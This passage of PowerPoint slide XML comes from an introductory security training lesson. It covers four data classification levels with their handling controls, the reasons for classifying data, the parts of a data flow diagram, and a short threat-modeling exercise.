              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{07A9F8D6-3E54-91C5-DE14-E0A374D530F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7075278" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Lightning micro-exercise:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Pick </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>one asset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> from the board.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Fill the template with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>one attacker type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Post results in chat</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1839841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57558-E05E-4902-13E4-F637E558B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56A21-C0A6-53FE-AF18-0BA9A41A3612}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1917941"/>
            <a:ext cx="10515600" cy="3020530"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Lesson 01 - Security Refresher</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Topic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 02 – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
              </a:rPr>
              <a:t>Data Classifications, DFD's, &amp; Trust Boundaries</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Cambria"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2735922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EE52E-49D9-E520-7F7B-107706F4C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28503-F3D2-93BC-3ED3-0573238F01E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.2 - Data Classifications</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mj-lt"/>
              <a:cs typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FFFFD114-7852-B3BD-F1D5-637FC8E38757}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7075278" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data Classification is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>the process of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>labeling data by sensitivity and business impact.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRP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2583320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4A5C-A742-197E-AAE7-C4887A2BE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BD8BE-563B-73E7-F42E-FC06DC9619CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.2 - Data Classification Level 1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mj-lt"/>
              <a:cs typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2C3ABB1A-7264-A686-2892-B1A09A2F2F58}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="6365829" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="514350" indent="-514350"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Public</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – Marketing website copy, published docs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Handling: No special controls; integrity still matters.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="224946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67DA-1562-F4A6-3078-5CDF7BFD1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40E90-569D-1AFD-E4B0-CCC084F0EE0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.2 - Data Classification Level 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mj-lt"/>
              <a:cs typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7B89515-6561-BDA8-D8A4-62BD48EB82A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="6365829" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Internal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> – Org charts, internal emails, non-public process docs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial,Sans-Serif" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Handling: Authenticated staff-only access; basic logging.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1283198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EC5BB-394B-398E-2BFD-45D642C90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BDE5D-4834-4CF8-E773-9E6E0EC76488}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.2 - Data Classification Level 3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mj-lt"/>
              <a:cs typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5475D638-062D-2C40-C43D-91274E7BE1EF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="6365829" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Confidential</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – Customer lists, financials, source code, non-public contracts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial,Sans-Serif" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Handling: Need-to-know access (RBAC/ABAC), encryption at rest/in transit, DLP alerts, change tracking.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3689261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0E962-4806-6FA3-E3F2-E60B8345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B63B1-A458-64F6-0B02-4367D398C2A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.2 - Data Classification Level 4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mj-lt"/>
              <a:cs typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DB04556C-61F3-E120-B653-315DD71D7433}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="6365829" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Restricted / Highly Confidential</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> –PII/PHI, credentials, encryption keys, cardholder data, M&amp;A plans</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial,Sans-Serif" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Handling: Strong auth (MFA), tight access approvals, HSM/KMS-backed key management, strict DLP (block not just warn), dedicated logging &amp; monitoring, short retention, extra egress controls.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial,Sans-Serif" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2037554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40C69-1A39-2F50-1B87-5DCEBA21C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4BAAC-7E44-587C-2292-8B1810F6564E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>1.1.2 - Data Classification – Why Classify?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mj-lt"/>
              <a:cs typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34E39217-29E0-BFF8-10B3-00BBE2431817}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7345543" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Why it matters:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Apply the right protections (AC, Encryption, Monitoring)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Focus security spend where risk is highest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Meet legal/regulatory duties (GDPR, HIPAA, PCI DSS, etc.)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Prevent accidental leaks and overexposure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Enable automation (DLP rules, encryption policies, retention)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3434066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1B30D-9435-C55B-CCB5-1B26BA78C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A2615-B273-7AD4-E254-C6439CDCB229}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.2 - Data Flow Diagrams (DFD's)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mj-lt"/>
              <a:cs typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{944C6BE6-B9F5-25AA-F51B-8CF21B109C6E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7345543" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A DFD is a lightweight map of:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Processes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (services, functions, lambdas)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Data stores</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (DBs, queues, files, caches)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>External entities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (users, third-party APIs, other orgs)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Data flows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (arrows showing where/what data moves)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="108504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A748-15AA-6D9A-D5F3-DB4D55D61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ED686-C067-1F3D-8509-AA3CA5CF8813}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.2 - DFD Uses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mj-lt"/>
              <a:cs typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
